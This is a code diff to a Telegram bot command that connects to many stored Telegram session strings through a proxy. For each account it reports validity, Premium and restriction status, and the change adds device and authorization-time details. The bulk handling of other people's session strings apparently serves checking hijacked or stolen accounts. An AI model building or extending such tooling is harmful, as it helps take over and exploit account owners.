@@ -438,7 +438,6 @@ async def cmd_log(message: types.Message):
     for i, session in enumerate(sessions, 1):
         phone = session.get("phone")
         session_str = session.get("session")
-        last_check_time = session.get("last_check_time", 0)  # Время последней проверки
         
         try:
             client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
@@ -453,40 +452,26 @@ async def cmd_log(message: types.Message):
                 premium = getattr(me, 'premium', False)
                 blocked = bool(getattr(me, 'restriction_reason', []))
                 
-                # Рассчитываем время с момента последней проверки
-                time_since_last_check = ""
-                if last_check_time > 0:
-                    last_check_dt = datetime.fromtimestamp(last_check_time)
-                    time_diff = datetime.now() - last_check_dt
-                    
-                    days = time_diff.days
-                    hours = time_diff.seconds // 3600
-                    minutes = (time_diff.seconds % 3600) // 60
-                    
-                    time_since_last_check = f" | Added: "
-                    if days > 0:
-                        time_since_last_check += f"{days}d "
-                    time_since_last_check += f"{hours}h {minutes}m ago"
+                # Получаем информацию о сеансах
+                auths = await client(GetAuthorizationsRequest())
+                session_info = ""
+                
+                for auth in auths.authorizations:
+                    if auth.current:  # Это текущая сессия бота
+                        auth_time = datetime.fromtimestamp(auth.date_active.timestamp())
+                        session_info = (
+                            f" | Device: {auth.device_model or 'PC'} | "
+                            f"Auth: {auth_time.strftime('%Y-%m-%d %H:%M:%S')}"
+                        )
+                        break
                 
                 results.append(
                     f"✅ {phone} | {country} | "
                     f"Premium: {'⭐️' if premium else '✖️'} | "
                     f"Blocked: {'🔴' if blocked else '🟢'}"
-                    f"{time_since_last_check}"
+                    f"{session_info}"
                 )
                 valid += 1
-                
-                # Обновляем время последней проверки
-                if is_main_admin(message.from_user.id):
-                    sessions_col.update_one(
-                        {"_id": session["_id"]},
-                        {"$set": {"last_check_time": int(time.time())}}
-                    )
-                else:
-                    light_sessions_col.update_one(
-                        {"_id": session["_id"]},
-                        {"$set": {"last_check_time": int(time.time())}}
-                    )
                 
         except Exception as e:
             results.append(f"❌ {phone} — Error: {str(e)[:50]}...")
